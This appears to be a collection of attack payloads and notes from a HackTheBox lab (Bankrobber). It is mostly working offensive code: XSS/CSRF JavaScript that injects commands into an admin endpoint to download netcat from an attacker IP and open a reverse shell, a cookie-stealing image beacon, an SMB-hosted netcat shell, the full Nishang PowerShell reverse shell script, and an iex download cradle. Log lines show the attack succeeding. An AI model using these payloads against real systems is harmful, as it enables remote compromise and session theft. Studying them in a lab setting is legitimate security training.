
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);


// This will get the admin user to make a request for me, which is a Cross-Site Request Forgery (XSRF) attack.
// I’ll submit the XSS payload to get shell.js through my logged in user, and wait for the payload to fire.:

// <script src="http://10.10.69.69/shell.js"></script>
// When it does, I’ll see a GET for shell.js, which will run, and issuing a POST to /admin/backdoorchecker.php with the parameters cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443. This will pass all the checks in backdoorchecker.php, and pass that on to system, which will run the dir, followed by the powershell to download nc64.exe from my server, save it in %temp%. Then my commands have it run nc to connect back to me with a shell.
//
// After a few minutes, that’s exactly what I see:
//
// 10.10.10.154 - - [22/Sep/2019 06:50:55] "GET /shell.js HTTP/1.1" 200 -
// 10.10.10.154 - - [22/Sep/2019 06:50:58] "GET /nc64.exe HTTP/1.1" 200 -
// And then a shell on my waiting nc listener (always use rlwrap with windows):

//////////////////////////
//
//

// Or.

//////////////////////////
//////////////////////////
// https://vulndev.io/2020/03/07/bankrobber-hackthebox/


	
<script src="http://<ip>:8000/script.js"></script>

//
//

function addImg(){
var img = document.createElement('img');
img.src = 'http://<ip>:8000/' + document.cookie;
document.body.appendChild(img);
}
addImg();

//
//

var xhr = new XMLHttpRequest();
document.cookie = "id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D";
var uri ="/admin/backdoorchecker.php";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cmd=dir|\\\\<ip>\\xshare\\share\\nc.exe <ip> 7000 -e cmd.exe");

////////////////////
//
//
//
// powershell



function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.123 -Port 443

	    
//	    	   
//
	    
<script> 
function shell() {    
    var http = new XMLHttpRequest();    
    var url = 'http://localhost/admin/backdoorchecker.php';    
    var params = "cmd=dir+|+powershell+/c+iex+(newobject+net.webclient).downloadstring('http://10.10.15.123/ Invoke.ps1')";    
    http.open('POST', url, true);    
    http.setRequestHeader('Content-type', 'application/x-www-formurlencoded');    
    http.send(params); 
}; shell(); </script> <img src=x onerror='shell()'/>

	
//	    	   
//

